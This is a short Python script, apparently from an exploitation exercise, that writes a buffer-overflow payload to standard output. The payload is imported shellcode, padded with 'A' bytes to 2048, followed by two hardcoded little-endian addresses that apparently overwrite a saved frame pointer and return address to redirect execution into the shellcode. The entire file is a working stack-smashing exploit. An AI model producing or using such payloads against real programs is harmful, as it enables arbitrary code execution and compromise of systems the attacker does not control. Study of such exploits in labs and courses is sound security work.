from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode+(2048-len(shellcode))*b'A'+0xfff6c6d8.to_bytes(4, "little")+0xfff6ceec.to_bytes(4, "little"))
